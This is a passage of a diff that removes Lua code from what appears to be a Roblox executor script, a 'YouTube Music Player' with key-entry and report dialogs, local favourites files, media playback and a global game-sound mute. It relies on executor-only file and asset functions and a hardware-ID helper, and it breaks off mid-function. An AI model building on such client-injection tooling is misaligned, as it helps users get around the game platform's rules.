-IconeKey.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-IconeKey.BackgroundTransparency = 1
-IconeKey.Image = "rbxassetid://108124574887969"
-IconeKey.Parent = SendKey
-KeyBox = Instance.new("TextBox")
-KeyBox.Size = UDim2.new(0, 186, 0, 41)
-KeyBox.Position = UDim2.new(0, 47, 0, 1)
-KeyBox.Text = ""
-KeyBox.ClearTextOnFocus = false
-KeyBox.PlaceholderText = Traducao.Key
-KeyBox.TextScaled = true
-KeyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-KeyBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
-KeyBox.BackgroundTransparency = 1
-KeyBox.Active = true
-KeyBox.Parent = KeyFrame
-GetKey = Instance.new("ImageButton")
-GetKey.Size = UDim2.new(0, 235, 0, 26)
-GetKey.Position = UDim2.new(0, 6, 0, 219)
-GetKey.BackgroundColor3 = Color3.fromRGB(47, 79, 79)
-GetKey.Visible = true
-GetKey.Parent = Tela6
-SetaES = Instance.new("ImageButton")
-SetaES.Size = UDim2.new(0, 26, 0, 26)
-SetaES.Position = UDim2.new(0, 0, 0, 0)
-SetaES.BackgroundColor3 = Color3.fromRGB(47, 79, 79)
-SetaES.Parent = GetKey
-SetaDI = Instance.new("ImageButton")
-SetaDI.Size = UDim2.new(0, 26, 0, 26)
-SetaDI.Position = UDim2.new(0, 209, 0, 0)
-SetaDI.BackgroundColor3 = Color3.fromRGB(47, 79, 79)
-SetaDI.Parent = GetKey
-Esquerda = Instance.new("TextLabel")
-Esquerda.Size = UDim2.new(0, 20, 0, 20)
-Esquerda.Position = UDim2.new(0, 3, 0, 2)
-Esquerda.BackgroundTransparency = 1
-Esquerda.Text = "<"
-Esquerda.TextColor3 = Color3.fromRGB(0, 0, 0)
-Esquerda.Font = Enum.Font.SourceSansBold
-Esquerda.TextSize = 25
-Esquerda.Parent = SetaES
-Direita = Instance.new("TextLabel")
-Direita.Size = UDim2.new(0, 20, 0, 20)
-Direita.Position = UDim2.new(0, 3, 0, 2)
-Direita.BackgroundTransparency = 1
-Direita.Text = ">"
-Direita.TextColor3 = Color3.fromRGB(0, 0, 0)
-Direita.Font = Enum.Font.SourceSansBold
-Direita.TextSize = 25
-Direita.Parent = SetaDI
-GetKeyTexto = Instance.new("TextLabel")
-GetKeyTexto.Size = UDim2.new(0, 165, 1, 0)
-GetKeyTexto.Position = UDim2.new(0, 35, 0, 0)
-GetKeyTexto.BackgroundTransparency = 1
-GetKeyTexto.Text = Traducao.Link
-GetKeyTexto.TextColor3 = Color3.fromRGB(70, 130, 180)
-GetKeyTexto.Font = Enum.Font.SourceSansBold
-GetKeyTexto.TextScaled = true
-GetKeyTexto.Parent = GetKey
-ReportFrame = Instance.new("Frame")
-ReportFrame.AnchorPoint = Vector2.new(0.5, 0.5)
-ReportFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
-ReportFrame.Size = UDim2.new(0, 300, 0, 250)
-ReportFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-ReportFrame.BorderSizePixel = 0
-ReportFrame.Visible = false
-ReportFrame.Parent = screenGui
-TituloReportFrame = Instance.new("Frame")
-TituloReportFrame.Size = UDim2.new(0, 286, 0, 30)
-TituloReportFrame.Position = UDim2.new(0, 7, 0, 6)
-TituloReportFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-TituloReportFrame.Parent = ReportFrame
-TextoTituloReportFrame = Instance.new("TextLabel")
-TextoTituloReportFrame.Size = UDim2.new(1, 0, 1, -4)
-TextoTituloReportFrame.Position = UDim2.new(0, 0, 0, 2)
-TextoTituloReportFrame.BackgroundTransparency = 1
-TextoTituloReportFrame.Text = "Report"
-TextoTituloReportFrame.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextoTituloReportFrame.TextScaled = true
-TextoTituloReportFrame.Font = Enum.Font.Highway
-TextoTituloReportFrame.Parent = TituloReportFrame
-LinhaReport = Instance.new("Frame")
-LinhaReport.Size = UDim2.new(1, 0, 0, 5)
-LinhaReport.Position = UDim2.new(0, 0, 0, 42)
-LinhaReport.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-LinhaReport.BorderSizePixel = 0
-LinhaReport.Parent = ReportFrame
-TextoReportFrameFrame = Instance.new("Frame")
-TextoReportFrameFrame.Size = UDim2.new(0, 286, 0, 135)
-TextoReportFrameFrame.Position = UDim2.new(0, 7, 0, 54)
-TextoReportFrameFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-TextoReportFrameFrame.Parent = ReportFrame
-TextoReportFrame = Instance.new("TextLabel")
-TextoReportFrame.Size = UDim2.new(0, 276, 0, 90)
-TextoReportFrame.Position = UDim2.new(0, 5, 0, 5)
-TextoReportFrame.BackgroundTransparency = 1
-TextoReportFrame.Text = ""
-TextoReportFrame.TextXAlignment = Enum.TextXAlignment.Left
-TextoReportFrame.TextColor3 = Color3.fromRGB(192, 192, 192)
-TextoReportFrame.TextScaled = true
-TextoReportFrame.Font = Enum.Font.Highway
-TextoReportFrame.Parent = TextoReportFrameFrame
-LinhaMotivo = Instance.new("Frame")
-LinhaMotivo.Size = UDim2.new(1, 0, 0, 2)
-LinhaMotivo.Position = UDim2.new(0, 0, 0, 100)
-LinhaMotivo.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-LinhaMotivo.BorderSizePixel = 0
-LinhaMotivo.Parent = TextoReportFrameFrame
-Motivo = Instance.new("Frame")
-Motivo.Size = UDim2.new(0, 274, 0, 23)
-Motivo.Position = UDim2.new(0, 6, 0, 107)
-Motivo.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Motivo.BorderSizePixel = 0
-Motivo.Parent = TextoReportFrameFrame
-MotivoBox = Instance.new("TextBox")
-MotivoBox.Size = UDim2.new(1, -6, 1, -6)
-MotivoBox.Position = UDim2.new(0, 3, 0, 3)
-MotivoBox.BackgroundTransparency = 1
-MotivoBox.Text = ""
-MotivoBox.PlaceholderText = Traducao.MotivoReport
-MotivoBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-MotivoBox.Font = Enum.Font.SourceSansBold
-MotivoBox.TextScaled = true
-MotivoBox.ClearTextOnFocus = false
-MotivoBox.Parent = Motivo
-Denunciar = Instance.new("ImageButton")
-Denunciar.Size = UDim2.new(0, 100, 0, 30)
-Denunciar.Position = UDim2.new(0, 193, 0, 210)
-Denunciar.BackgroundColor3 = Color3.fromRGB(207, 55, 52)
-Denunciar.Active = true
-Denunciar.Parent = ReportFrame
-FotoReport = Instance.new("ImageLabel")
-FotoReport.Size = UDim2.new(0, 40, 0, 40)
-FotoReport.Position = UDim2.new(0, 131, 0, 200)
-FotoReport.BackgroundTransparency = 1
-FotoReport.Image = ""
-FotoReport.Parent = ReportFrame
-CancelarReport = Instance.new("ImageButton")
-CancelarReport.Size = UDim2.new(0, 100, 0, 30)
-CancelarReport.Position = UDim2.new(0, 7, 0, 210)
-CancelarReport.BackgroundColor3 = Color3.fromRGB(127, 127, 127)
-CancelarReport.Active = true
-CancelarReport.Parent = ReportFrame
-DenunciarTexto = Instance.new("TextLabel")
-DenunciarTexto.Size = UDim2.new(1, -6, 1, -6)
-DenunciarTexto.Position = UDim2.new(0, 3, 0, 3)
-DenunciarTexto.BackgroundTransparency = 1
-DenunciarTexto.Text = "Report"
-DenunciarTexto.TextColor3 = Color3.fromRGB(255, 255, 255)
-DenunciarTexto.TextScaled = true
-DenunciarTexto.Parent = Denunciar
-CancelarReportTexto = Instance.new("TextLabel")
-CancelarReportTexto.Size = UDim2.new(1, -6, 1, -6)
-CancelarReportTexto.Position = UDim2.new(0, 3, 0, 3)
-CancelarReportTexto.BackgroundTransparency = 1
-CancelarReportTexto.Text = Traducao.Cancelar
-CancelarReportTexto.TextColor3 = Color3.fromRGB(255, 255, 255)
-CancelarReportTexto.TextScaled = true
-CancelarReportTexto.Parent = CancelarReport
-BlurEffect = Instance.new("BlurEffect")
-BlurEffect.Size = 0
-BlurEffect.Parent = v3
-Warn = Instance.new("Frame")
-Warn.AnchorPoint = Vector2.new(0.5, 0.5)
-Warn.Position = UDim2.new(0.5, 0, 0.5, 0)
-Warn.Size = UDim2.new(0, 300, 0, 250)
-Warn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Warn.BorderSizePixel = 0
-Warn.Visible = false
-Warn.Parent = screenGui
-TituloWarn = Instance.new("Frame")
-TituloWarn.Size = UDim2.new(0, 286, 0, 30)
-TituloWarn.Position = UDim2.new(0, 7, 0, 6)
-TituloWarn.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-TituloWarn.Parent = Warn
-TextoTituloWarn = Instance.new("TextLabel")
-TextoTituloWarn.Size = UDim2.new(1, 0, 1, -4)
-TextoTituloWarn.Position = UDim2.new(0, 0, 0, 2)
-TextoTituloWarn.BackgroundTransparency = 1
-TextoTituloWarn.Text = Traducao.Aviso
-TextoTituloWarn.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextoTituloWarn.TextScaled = true
-TextoTituloWarn.Font = Enum.Font.Highway
-TextoTituloWarn.Parent = TituloWarn
-Linha = Instance.new("Frame")
-Linha.Size = UDim2.new(1, 0, 0, 5)
-Linha.Position = UDim2.new(0, 0, 0, 42)
-Linha.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-Linha.BorderSizePixel = 0
-Linha.Parent = Warn
-TextoWarnFrame = Instance.new("Frame")
-TextoWarnFrame.Size = UDim2.new(0, 286, 0, 125)
-TextoWarnFrame.Position = UDim2.new(0, 7, 0, 54)
-TextoWarnFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-TextoWarnFrame.Parent = Warn
-TextoWarn = Instance.new("TextLabel")
-TextoWarn.Size = UDim2.new(0, 276, 0, 115)
-TextoWarn.Position = UDim2.new(0, 5, 0, 5)
-TextoWarn.BackgroundTransparency = 1
-TextoWarn.Text = ""
-TextoWarn.TextXAlignment = Enum.TextXAlignment.Left
-TextoWarn.TextColor3 = Color3.fromRGB(192, 192, 192)
-TextoWarn.TextScaled = true
-TextoWarn.Font = Enum.Font.Highway
-TextoWarn.Parent = TextoWarnFrame
-CloseWarn = Instance.new("ImageButton")
-CloseWarn.Size = UDim2.new(0, 150, 0, 30)
-CloseWarn.AnchorPoint = Vector2.new(0.5, 0.5)
-CloseWarn.Position = UDim2.new(0.5, 0, 0, 215)
-CloseWarn.BackgroundColor3 = Color3.fromRGB(207, 55, 52)
-CloseWarn.BackgroundTransparency = 0
-CloseWarn.Parent = Warn
-CloseWarnTexto = Instance.new("TextLabel")
-CloseWarnTexto.Size = UDim2.new(1, -6, 1, -6)
-CloseWarnTexto.Position = UDim2.new(0, 3, 0, 3)
-CloseWarnTexto.BackgroundTransparency = 1
-CloseWarnTexto.Text = Traducao.FecharAviso
-CloseWarnTexto.TextColor3 = Color3.fromRGB(255, 255, 255)
-CloseWarnTexto.TextScaled = true
-CloseWarnTexto.Parent = CloseWarn
-
-YmpHwid = function()
-	return v14
-end
-
-YmpClipboard = function(arg)
-	if setclipboard_ then
-		pcall(function()
-			setclipboard_(arg)
-		end)
-	end
-end
-
-YmpRequest = function(...)
-	return requestAsync(...)
-end
-
-scrolls = { ScrollTodos, ScrollMusicas, ScrollVideos, ScrollRoblox, ScrollFav, ScrollLocal, ScrollPesquisa }
-
-ApiInfo = function(arg)
-	local n4 = 0
-
-	while n4 < 8 do
-		n4 += 1
-
-		local ok3, result3, result4, result5, result6 = pcall(function()
-			local response = game:HttpGet(str3 .. "/info?url=" .. "https://youtu.be/" .. arg)
-			local data2 = HttpService:JSONDecode(response)
-			return data2.Name, data2.Author, data2.Thumbnail, data2.AuthorUrl
-		end)
-
-		if ok3 and result3 then
-			return result3, result4, result5, result6
-		end
-		task.wait(2)
-	end
-
-	return nil
-end
-
-ApiRoblox = function(arg)
-	local n4 = 0
-
-	while n4 < 8 do
-		n4 += 1
-
-		local ok3, result3, result4, result5, result6 = pcall(function()
-			local response = game:HttpGet(str3 .. "/roblox?assetId=" .. tostring(arg))
-			local data2 = HttpService:JSONDecode(response)
-			return data2.Name, data2.Creator.Id, data2.Creator.Name, data2.Public
-		end)
-
-		if ok3 and result3 then
-			return result3, result4, result5, result6
-		end
-		task.wait(2)
-	end
-
-	return nil
-end
-
-local flag19 = false
-local flag20 = false
-
-processQueue = function()
-	if flag7 then
-		return
-	end
-	flag7 = true
-
-	while #tbl7 > 0 do
-		table.remove(tbl7, 1)()
-	end
-
-	flag7 = false
-end
-
-FavoritarFile = function(arg)
-	task.spawn(function()
-		table.insert(tbl7, function()
-			local ok3, result3 = pcall(function()
-				return HttpService:JSONDecode(readfile("YouTube Music Player/Internal/Data.json"))
-			end)
-
-			local v17 = ok3 and result3
-			local tbl12
-
-			if v17 then
-				tbl12 = v17
-			else
-				tbl12 = { { Key = "", Favorites = tbl6 or {} } }
-			end
-
-			tbl12[1] = tbl12[1] or { Key = "", Favorites = {} }
-			tbl12[1].Favorites = tbl12[1].Favorites or {}
-			local favorites = tbl12[1].Favorites
-
-			for _, favorite in ipairs(favorites) do
-				if favorite == arg then
-					tbl6 = favorites
-					return
-				end
-			end
-
-			table.insert(favorites, arg)
-			tbl6 = favorites
-
-			pcall(function()
-				writefile("YouTube Music Player/Internal/Data.json", HttpService:JSONEncode(tbl12))
-			end)
-		end)
-
-		processQueue()
-	end)
-end
-
-DesfavoritarFile = function(arg)
-	task.spawn(function()
-		table.insert(tbl7, function()
-			local ok3, result3 = pcall(function()
-				return HttpService:JSONDecode(readfile("YouTube Music Player/Internal/Data.json"))
-			end)
-
-			ok3 = ok3 and result3
-			local tbl12
-
-			if ok3 then
-				tbl12 = ok3
-			else
-				tbl12 = { { Key = "", Favorites = tbl6 or {} } }
-			end
-
-			tbl12[1] = tbl12[1] or { Key = "", Favorites = {} }
-			tbl12[1].Favorites = tbl12[1].Favorites or {}
-			local favorites = tbl12[1].Favorites
-
-			for i, favorite in ipairs(favorites) do
-				if favorite == arg then
-					table.remove(favorites, i)
-					break
-				end
-			end
-
-			tbl6 = favorites
-
-			pcall(function()
-				writefile("YouTube Music Player/Internal/Data.json", HttpService:JSONEncode(tbl12))
-			end)
-		end)
-
-		processQueue()
-	end)
-end
-
-pcall(function()
-	local data2 = HttpService:JSONDecode(readfile("YouTube Music Player/Internal/Data.json"))
-
-	if data2[1] and data2[1].Favorites then
-		tbl6 = data2[1].Favorites
-	end
-end)
-
-local sound2 = Instance.new("Sound")
-sound2.Parent = v7
-sound2.Looped = false
-sound2.Volume = 1
-sound2.SoundId = ""
-sound2.PlaybackSpeed = 1
-Equalizer = Instance.new("EqualizerSoundEffect")
-Equalizer.LowGain = 1
-Equalizer.MidGain = 1
-Equalizer.HighGain = 1
-Equalizer.Parent = sound2
-VolumesOriginais = {}
-MuteCon = nil
-Mutado = false
-
-GlobalMute = function(arg)
-	pcall(function()
-		if arg then
-			if Mutado then
-				return
-			end
-			Mutado = true
-
-			local function fn4(arg2)
-				pcall(function()
-					if not arg2:IsA("Sound") then
-						return
-					end
-
-					if arg2 == sound2 or arg2 == sound then
-						return
-					end
-
-					if VolumesOriginais[arg2] == nil then
-						VolumesOriginais[arg2] = arg2.Volume
-					end
-
-					arg2.Volume = 0
-				end)
-			end
-
-			for _, descendant in ipairs(game:GetDescendants()) do
-				fn4(descendant)
-			end
-
-			MuteCon = game.DescendantAdded:Connect(function(descendant)
-				if Mutado then
-					fn4(descendant)
-				end
-			end)
-		else
-			if not Mutado then
-				return
-			end
-			Mutado = false
-
-			if MuteCon then
-				MuteCon:Disconnect()
-				MuteCon = nil
-			end
-
-			for k, v17 in pairs(VolumesOriginais) do
-				pcall(function()
-					if k and k.Parent and k ~= sound2 then
-						k.Volume = v17
-					end
-				end)
-			end
-
-			table.clear(VolumesOriginais)
-		end
-	end)
-end
-
-Mutar.MouseButton1Click:Connect(function()
-	if Mutar.Image == "rbxassetid://109518972658686" then
-		Mutar.Image = "rbxassetid://139303337799549"
-		fn3(Traducao.Mutado, Traducao.SobreMute, 5)
-		GlobalMute(true)
-	else
-		Mutar.Image = "rbxassetid://109518972658686"
-		fn3(Traducao.Desmutado, Traducao.SobreUnmute, 5)
-		GlobalMute(false)
-	end
-end)
-
-BibliotecaMusicas = {}
-BilbliotecaVideos = {}
-BibliotecaRoblox = {}
-BibliotecaLocal = {}
-Girando = false
-Congelado = false
-GiroBackup = 1
-GiroSpeed = 1
-
-Girar = function(arg)
-	if arg then
-		Girando = true
-		Congelado = false
-	else
-		Girando = false
-		Disco.Rotation = 0
-		Congelado = false
-	end
-end
-
-SetFreeze = function(arg)
-	Congelado = arg
-end
-
-task.spawn(function()
-	while true do
-		if Girando and not Congelado and GiroSpeed > 0 then
-			local v17 = Disco
-			v17.Rotation = v17.Rotation + GiroSpeed
-		end
-
-		task.wait(0.02)
-	end
-end)
-
-formatar = function(arg)
-	local n4 = math.floor(arg / 60)
-	local n5 = math.floor(arg % 60)
-	return string.format("%02d:%02d", n4, n5)
-end
-
-Reset = function()
-	Rastro.Size = UDim2.new(0, 0, 1, 0)
-	BolaProgresso.AnchorPoint = Vector2.new(0, 0.5)
-	BolaProgresso.Position = UDim2.new(0, 0, 0.5, 0)
-	TimerAtual.Text = "00:00"
-end
-
-setProgress = function(arg)
-	local n4 = math.clamp(arg, 0, 1)
-	Rastro.Size = UDim2.new(n4, 0, 1, 0)
-	BolaProgresso.AnchorPoint = Vector2.new(n4, 0.5)
-	BolaProgresso.Position = UDim2.new(n4, 0, 0.5, 0)
-end
-
-getProgress = function(arg)
-	local x = BarraProgresso.AbsolutePosition.X
-	local x2 = BarraProgresso.AbsoluteSize.X
-	if x2 <= 0 then
-		return 0
-	end
-	return math.clamp((arg - x) / x2, 0, 1)
-end
-
-seek = function(arg)
-	local v17 = v12
-	local flag21 = v12
-
-	if v17 then
-		flag21 = v17.TimeLength > 0
-	end
-
-	if flag21 then
-		TimerAtual.Text = formatar(arg * v17.TimeLength)
-	end
-end
-
-BarraProgresso.InputBegan:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-		local v17 = v12
-		local flag21 = v12
-
-		if v17 then
-			flag21 = v17.TimeLength > 0
-		end
-
-		if flag21 and flag9 then
-			flag8 = true
-			local v18 = getProgress(input.Position.X)
-			setProgress(v18)
-			seek(v18)
-		end
-	end
-end)
-
-BolaProgresso.InputBegan:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-		local v17 = v12
-		local flag21 = v12
-
-		if v17 then
-			flag21 = v17.TimeLength > 0
-		end
-
-		if flag21 and flag9 then
-			flag8 = true
-		end
-	end
-end)
-
-v9.InputEnded:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-		if flag8 then
-			local v17 = v12
-			local flag21 = v12
-
-			if v17 then
-				flag21 = v17.TimeLength > 0
-			end
-
-			if flag21 and flag9 then
-				local timeLength = v17.TimeLength
-				v17.TimePosition = math.clamp(getProgress(input.Position.X), 0, 0.999) * timeLength
-			end
-
-			flag8 = false
-		end
-	end
-end)
-
-v9.InputChanged:Connect(function(input)
-	if flag8 then
-		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-			local v17 = v12
-			local flag21 = v12
-
-			if v17 then
-				flag21 = v17.TimeLength > 0
-			end
-
-			if flag21 and flag9 then
-				local n4 = math.clamp(getProgress(input.Position.X), 0, 0.999)
-				setProgress(n4)
-				seek(n4)
-			end
-		end
-	end
-end)
-
-task.spawn(function()
-	while true do
-		task.wait(0.1)
-		local v17 = v12
-		local flag21 = v12
-
-		if v17 then
-			flag21 = v17.TimeLength > 0
-		end
-
-		if flag21 and not flag8 then
-			local timePosition = v17.TimePosition
-			setProgress(timePosition / v17.TimeLength)
-			TimerAtual.Text = formatar(timePosition)
-		end
-	end
-end)
-
-Equalizador = function(arg)
-	if arg == true then
-		EquaFrame.Size = UDim2.new(0, 235, 0, 187)
-		NoEquaFrame.Visible = false
-		ScrollEqua.ScrollingEnabled = true
-	else
-		EquaFrame.Size = UDim2.new(0, 235, 0, 49)
-		NoEquaFrame.Visible = true
-		ScrollEqua.CanvasPosition = Vector2.new(0, 0)
-		ScrollEqua.ScrollingEnabled = false
-	end
-end
-
-Selecionar = function(arg, arg2)
-	local tbl12 = { ScrollTodos, ScrollMusicas, ScrollVideos, ScrollRoblox, ScrollFav, ScrollLocal, ScrollPesquisa }
-	local v17 = nil
-
-	for _, v18 in ipairs(tbl12) do
-		for _, child in ipairs(v18:GetChildren()) do
-			if child:IsA("ImageButton") then
-				local v19 = string.split(child.Name, ":")
-				if v19[1] == arg2 and v19[2] == arg then
-					v17 = child
-					break
-				end
-			end
-		end
-
-		if not v17 then
-			continue
-		end
-		break
-	end
-
-	if not v17 then
-		return
-	end
-
-	local function fn4(arg3)
-		local imageLabel = arg3:FindFirstChildOfClass("ImageLabel")
-		arg3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-
-		if imageLabel then
-			Stroke(imageLabel, 50, 50, 50, 2)
-		end
-
-		Stroke(arg3, 50, 50, 50, 2)
-
-		for _, child in ipairs(arg3:GetChildren()) do
-			if child:IsA("ImageButton") then
-				Stroke(child, 50, 50, 50, 2)
-			end
-		end
-	end
-
-	if BotaoSelecionadoAtual == v17 then
-		for _, v18 in ipairs(tbl12) do
-			for _, child in ipairs(v18:GetChildren()) do
-				if child:IsA("ImageButton") then
-					fn4(child)
-				end
-			end
-		end
-
-		BotaoSelecionadoAtual = nil
-		return
-	end
-
-	for _, v18 in ipairs(tbl12) do
-		for _, child in ipairs(v18:GetChildren()) do
-			if child:IsA("ImageButton") then
-				fn4(child)
-			end
-		end
-	end
-
-	local imageLabel = v17:FindFirstChildOfClass("ImageLabel")
-	v17.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
-
-	if imageLabel then
-		Stroke(imageLabel, 255, 0, 0, 2)
-	end
-
-	Stroke(v17, 255, 0, 0, 2)
-
-	for _, child in ipairs(v17:GetChildren()) do
-		if child:IsA("ImageButton") then
-			Stroke(child, 255, 0, 0, 2)
-		end
-	end
-
-	BotaoSelecionadoAtual = v17
-end
-
-CurrentMediaId = nil
-thumbAtual = nil
-BloquearMidia = false
-
-resetSound = function(arg)
-	if arg then
-		pcall(function()
-			arg:Stop()
-			arg.SoundId = ""
-			arg.TimePosition = 0
-		end)
-	end
-end
-
-resetVideo = function(arg)
-	if arg then
-		pcall(function()
-			arg:Pause()
-			arg.Video = ""
-			arg.TimePosition = 0
-		end)
-	end
-end
-
-local function fn4(arg, arg2)
-	if not arg2 or not arg then
-		return
-	end
-
-	if BloquearMidia then
-		fn3(Traducao.Aguarde, Traducao.DownloadFazendo, 5)
-		return
-	end
-	resetSound(sound2)
-	resetVideo(Video)
-	resetVideo(MiniVideo)
-	BloquearMidia = true
-	local n4 = math.random()
-	CurrentRequestId = n4
-	task.wait(0.05)
-	CurrentMediaId = arg2
-	thumbAtual = nil
-	local currentPlaying = arg .. ":" .. arg2
-	Selecionar(arg, arg2)
-	local visible = imageButton2.Visible
-
-	if _G.CurrentPlaying == currentPlaying then
-		_G.CurrentPlaying = nil
-		Reset()
-		Play.Image = "rbxassetid://110560238983134"
-		MiniPlay.Image = "rbxassetid://119936293795425"
-		flag9 = false
-		Girar(false)
-		Equalizador(true)
-		GiroSpeed = GiroBackup
-		BloquearMidia = false
-
-		if visible then
-			Musica.Image = "rbxassetid://109021809317392"
-		else
-			Musica.Image = "rbxassetid://120329190202259"
-		end
-
-		Musica.ImageRectOffset = Vector2.new(0, 0)
-		Musica.ImageRectSize = Vector2.new(0, 0)
-		MiniMusica.Image = "rbxassetid://120329190202259"
-		MiniMusica.ImageRectOffset = Vector2.new(0, 0)
-		MiniMusica.ImageRectSize = Vector2.new(0, 0)
-		Musica.Visible = true
-		MiniMusica.Visible = true
-		Video.Visible = false
-		MiniVideo.Visible = false
-		TimerTotal.Text = "00:00"
-		FotoAutor.Image = "rbxassetid://130243480255582"
-		TituloMusica.Text = "<font color=\"rgb(255,255,255)\">" .. Traducao.Hey .. "</font>\n" .. "<font color=\"rgb(192,192,192)\">" .. Traducao.Play .. "</font>"
-		return
-	end
-
-	_G.CurrentPlaying = currentPlaying
-	Play.Image = "rbxassetid://80704722265943"
-	MiniPlay.Image = "rbxassetid://110232191351528"
-	flag9 = true
-
-	if sound2 then
-		pcall(function()
-			sound2:Stop()
-			sound2.TimePosition = 0
-		end)
-	end
-
-	if Video then
-		pcall(function()
-			Video:Pause()
-			Video.TimePosition = 0
-		end)
-	end
-
-	if MiniVideo then
-		pcall(function()
-			MiniVideo:Pause()
-			MiniVideo.TimePosition = 0
-		end)
-	end
-
-	local function fn5(arg3)
-		v12 = arg3 and (visible and MiniVideo or Video) or sound2
-		Musica.Visible = true
-		MiniMusica.Visible = true
-		Video.Visible = arg3 and not visible
-		MiniVideo.Visible = arg3 and visible
-	end
-
-	local function fn6(arg3, arg4)
-		return "<font color=\"rgb(255,255,255)\">" .. arg3 .. "</font>\n<font color=\"rgb(192,192,192)\">" .. Traducao.De .. " " .. arg4 .. "</font>"
-	end
-
-	local function fn7(arg3)
-		local n5 = math.floor(arg3 or 0)
-		return string.format("%02d:%02d", math.floor(n5 / 60), n5 % 60)
-	end
-
-	local function fn8(arg3)
-		local ok3, result3 = pcall(function()
-			return getcustomasset(arg3)
-		end)
-
-		if ok3 and typeof(result3) == "string" then
-			return result3
-		end
-		return nil
-	end
-
-	local function fn9(arg3, arg4)
-		local str6 = "YouTube Music Player/Internal/Cache/" .. arg4 .. ".png"
-		if isfile(str6) then
-			return fn8(str6)
-		end
-
-		local ok3 = pcall(function()
-			local response = game:HttpGet(arg3)
-			if not response or typeof(response) ~= "string" or #response < 50 then
-				return
-			end
-			writefile(str6, response)
-		end)
-
-		task.wait(0.08)
-		if not ok3 or not isfile(str6) then
-			return nil
-		end
-		return fn8(str6)
-	end
-
-	local function fn10()
-		if arg == "Musica" then
-			for _, v17 in ipairs(BibliotecaMusicas) do
-				if v17.id == arg2 then
-					return v17
-				end
-			end
-		elseif arg == "Video" then
-			for _, v17 in ipairs(BilbliotecaVideos) do
-				if v17.id == arg2 then
-					return v17
-				end
-			end
-		elseif arg == "Roblox" then
-			for _, v17 in ipairs(BibliotecaRoblox) do
-				if v17.id == arg2 then
-					return v17
-				end
-			end
-		elseif arg == "Local" then
-			for _, v17 in ipairs(BibliotecaLocal) do
-				if v17.name == arg2 then
-					return v17
-				end
-			end
-		end
-	end
-
-	local v17 = fn10()
-	if not v17 then
-		return
-	end
-	TimerTotal.Text = "00:00"
-	Girar(true)
-
-	if arg == "Musica" or arg == "Video" then
-		fn5(arg == "Video")
-		local v18 = visible and MiniMusica or Musica
-		v18.Image = "rbxassetid://108154884074176"
-		v18.ImageRectOffset = Vector2.new(0, 0)
-		v18.ImageRectSize = Vector2.new(0, 0)
-		FotoAutor.Image = "rbxassetid://108154884074176"
-		TituloMusica.Text = fn6(v17.name, v17.author)
-
-		task.spawn(function()
-			task.wait(0.05)
-			if CurrentRequestId ~= n4 then
-				return
-			end
-			local authorUrl = v17.authorUrl and fn9(v17.authorUrl, "author_" .. arg2)
-			if CurrentRequestId ~= n4 then
-				return
-			end
-			FotoAutor.Image = authorUrl or "rbxassetid://106804518898726"
-
-			if arg == "Musica" and v17.thumb then
-				local v19 = fn9(v17.thumb, "thumb_" .. arg2)
-				if CurrentRequestId ~= n4 then
-					return
-				end
-
-				if v19 then
-					v18.Image = v19
-					thumbAtual = v19
-					v18.ImageRectOffset = Vector2.new(0, 45)
-					v18.ImageRectSize = Vector2.new(480, 270)
-				else
-					v18.Image = "rbxassetid://110787075859454"
-					v18.ImageRectOffset = Vector2.new(0, 0)
-					v18.ImageRectSize = Vector2.new(0, 0)
-				end
-			end
-
-			BloquearMidia = false
-		end)
-
-		if arg == "Musica" then
-			pcall(function()
-				sound2.SoundId = getcustomasset("YouTube Music Player/Musics/" .. arg2 .. ".mp3")
-				sound2:Play()
-				Equalizador(true)
-				GiroSpeed = GiroBackup
-
-				task.spawn(function()
-					local n5 = 0
-
-					while sound2.TimeLength == 0 and n5 < 5 do
-						n5 += task.wait(0.1)
-					end
-
-					if CurrentRequestId ~= n4 then
-						return
-					end
-					TimerTotal.Text = fn7(sound2.TimeLength)
-				end)
-			end)
-		else
-			pcall(function()
-				local v19 = getcustomasset("YouTube Music Player/Videos/" .. arg2 .. ".webm")
-				local v20 = visible and MiniVideo or Video
-				v20.Video = v19
-				v20:Play()
-				Equalizador(false)
-				GiroSpeed = 1
-
-				task.spawn(function()
-					local n5 = 0
-
-					while v20.TimeLength == 0 and n5 < 5 do
-						n5 += task.wait(0.1)
-					end
-
-					if CurrentRequestId ~= n4 then
-						return
-					end
-					TimerTotal.Text = fn7(v20.TimeLength)
-				end)
-			end)
-		end
-	elseif arg == "Roblox" then
-		fn5(false)
-		local v18 = visible and MiniMusica or Musica
-		v18.Image = "rbxassetid://100415102639682"
-		v18.ImageRectOffset = Vector2.new(0, 0)
-		v18.ImageRectSize = Vector2.new(0, 0)
-		TituloMusica.Text = "<font color=\"rgb(255,255,255)\">" .. v17.name .. "</font>\n" .. "<font color=\"rgb(192,192,192)\">" .. Traducao.De .. " " .. v17.creatorName .. "</font>"
-		FotoAutor.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. v17.creatorId .. "&width=420&height=420&format=png"
-
-		pcall(function()
-			sound2.SoundId = "rbxassetid://" .. arg2
-			sound2:Play()
-			Equalizador(true)
-			GiroSpeed = GiroBackup
-
-			task.spawn(function()
-				local n5 = 0
-
